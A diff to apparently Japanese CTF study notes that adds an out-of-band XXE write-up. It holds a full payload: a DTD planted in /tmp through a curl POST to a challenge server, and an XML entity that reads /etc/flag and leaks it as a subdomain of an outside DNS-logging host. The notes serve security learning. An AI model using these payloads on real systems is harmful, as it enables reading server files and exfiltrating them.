@@ -234,10 +234,34 @@ https://www.rootnetsec.com/bsidessf-svgmagick/
   <text x="10" y="20">&file;</text>
 </svg>
 ```
-## sample
+## OOB XXE (create DTDfile into server / DNS SubDomain)
+https://graneed.hatenablog.com/entry/2019/11/11/081011   
+
 - **entrypoint**   
+`index.php`のソースコードが与えられてその中で`loadXML`の中に`$_POST['content']`が入っているのでXXEと疑う。結果が返ってこないのでOOB XMLとわかる。   
 - **概要**   
+OOB XXEにはDTDファイルが必要だが今回はIptablesによって外部への通信がDNS以外ブロックされるため、入力データを`/tmp`に保存していることを利用してサーバー内にDTDファイルを作成する。DTDファイルは拡張子は何でも良さそう(.htmlでも)。   
+   
+リークさせる通信も53ポート以外は使えないので、DNSのサブドメインへのクエリを確認できるドメインを払い出す`DNSBin`というツールを使って`51a19e650babb6f295ed.d.zhack.ca`みたいなサブドメインを求めて、攻撃者サーバー53ポートでリッスンする。   
+そして、DTDファイルを作成した後に、それを参照するようなXXE Payloadを送信する。   
+
 - **Payload**   
+```txt
+// <!ENTITY % all "<!ENTITY send SYSTEM 'http://%file;.51a19e650babb6f295ed.d.zhack.ca/'>">
+%all;
+// このDTDファイルを作成するためのリクエスト
+$ curl http://167.71.102.84/index.php -d "content=%3C%21ENTITY+%25+all+%22%3C%21ENTITY+send+SYSTEM+%27http%3A%2F%2F%25file%3B.51a19e650babb6f295ed.d.zhack.ca%2F%27%3E%22%3E%0D%0A%25all%3B" -v
+
+
+// 二回目のこのリクエストで攻撃者の53ポートにフラグ付きのリクエストが送信されてくる(SSRF)
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE data [
+  <!ENTITY % file SYSTEM "file:///etc/flag">
+  <!ENTITY % dtd SYSTEM "/tmp/5e870399feeb3947c7f6c27b3ee0d71e.html">
+  %dtd;
+]>
+<data>&send;</data>
+```
 ## sample
 - **entrypoint**   
 - **概要**   
